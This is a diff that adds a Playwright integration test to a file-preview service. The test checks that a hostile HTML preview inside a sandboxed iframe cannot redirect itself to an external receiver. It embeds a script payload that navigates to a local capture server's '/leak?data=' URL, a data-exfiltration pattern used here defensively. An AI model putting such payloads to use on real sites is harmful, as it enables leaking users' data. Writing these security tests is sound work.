@@ -1,5 +1,6 @@
 import base64
 import io
+import http.server
 import json
 import os
 from pathlib import Path
@@ -192,6 +193,38 @@ class VisualHttpIntegrationTests(VisualHttpFixture):
             finally:
                 browser.close()
 
+
+    def test_hostile_preview_cannot_navigate_itself_to_an_external_origin(self):
+        captured = []
+        class Capture(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):
+                captured.append(self.path)
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'synthetic receiver')
+            def log_message(self, *args):
+                pass
+        capture = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Capture)
+        thread = threading.Thread(target=capture.serve_forever, daemon=True)
+        thread.start()
+        self.addCleanup(thread.join, 2)
+        self.addCleanup(capture.server_close)
+        self.addCleanup(capture.shutdown)
+        attack = (f"<script>setTimeout(() => location.href = 'http://127.0.0.1:{capture.server_port}/leak?data=synthetic-only', 100)</script>").encode()
+        self.register({'index.html': attack})
+        version = self.workspace()['creations'][0]['versions'][0]
+        with sync_playwright() as playwright:
+            browser = playwright.chromium.launch()
+            try:
+                page = browser.new_page()
+                page.goto(self.url)
+                page.evaluate("""url => { const frame = document.createElement('iframe');
+                    frame.sandbox = 'allow-scripts'; frame.referrerPolicy = 'no-referrer';
+                    frame.src = url; document.body.append(frame); }""", self.url + version['preview_url'])
+                page.wait_for_timeout(700)
+                self.assertEqual(captured, [], 'Hostile preview self-navigation reached an external receiver')
+            finally:
+                browser.close()
 
     def test_document_previews_render_content_and_offer_original_downloads(self):
         pdf_stream = b'BT /F1 25 Tf 24 375 Td (VISIBLE PDF FIXTURE) Tj ET\n0.9 0.1 0.2 rg 24 120 240 200 re f'
